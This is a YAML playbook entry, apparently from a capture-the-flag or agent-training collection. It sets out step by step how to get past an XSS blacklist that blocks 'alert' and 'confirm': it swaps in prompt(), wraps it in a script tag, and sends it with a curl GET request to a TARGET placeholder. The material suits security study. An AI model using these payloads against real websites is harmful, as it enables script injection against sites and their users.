name: prompt_xss_blacklist_bypass_cross5
category: web
tags: [xss, injection, blacklist_bypass, prompt]
indicators:
  - "Input directly inserted into HTML"
  - "Blacklist filters alert and confirm"
  - "Need to trigger popup dialog"
  - "PhantomJS validates XSS"

tricks:
  - name: "Step 1: Identify injection point"
    when: "Analyze source code"
    how: "User input directly inserted into HTML after input tag"
    payload: |
      <input ... > {msg}  # Direct HTML injection

  - name: "Step 2: Analyze blacklist"
    when: "Regular XSS fails"
    how: "Blacklist only contains alert and confirm (case insensitive)"
    payload: |
      blacklist = ['alert','confirm']

  - name: "Step 3: Find unfiltered function"
    when: "Need to bypass blacklist"
    how: "prompt() is not filtered, PhantomJS onPrompt captures it"
    payload: |
      prompt('XSS')  # Alternative to alert('XSS')

  - name: "Step 4: Construct payload"
    when: "Found bypass"
    how: "Use script tag with prompt"
    payload: |
      <script>prompt('XSS')</script>

  - name: "Step 5: Submit payload"
    when: "Execute attack"
    how: "GET request to /page with name parameter"
    payload: |
      curl "http://TARGET/page?name=%3Cscript%3Eprompt(%27XSS%27)%3C/script%3E"

